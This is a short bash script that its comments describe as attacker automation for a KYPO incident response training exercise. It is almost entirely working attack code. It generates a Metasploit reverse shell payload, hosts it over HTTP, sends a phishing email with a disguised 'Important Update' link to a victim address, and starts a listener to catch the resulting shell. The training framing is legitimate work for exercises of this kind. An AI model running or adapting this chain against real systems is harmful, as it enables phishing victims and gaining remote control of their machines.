#!/bin/bash
# Basic attacker automation for the KYPO incident response scenario.
# This demonstrates phishing and exploitation steps used during the exercise.

set -e

ATTACKER_IP="$(hostname -I | awk '{print $1}')"

# Generate a reverse shell payload using Metasploit
msfvenom -p linux/x64/shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=4444 -f elf -o /tmp/payload.elf

# Host the payload via a simple HTTP server
python3 -m http.server 8080 --directory /tmp &
HTTP_PID=$!

# Send a phishing email with a link to the malicious payload
MAIL_SUBJECT="Important Update"
MAIL_BODY="Please review the attached document: http://$ATTACKER_IP:8080/payload.elf"
echo "$MAIL_BODY" | mail -s "$MAIL_SUBJECT" victim@example.com

# Start a Metasploit listener to receive the shell
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST $ATTACKER_IP; set LPORT 4444; exploit" && kill $HTTP_PID
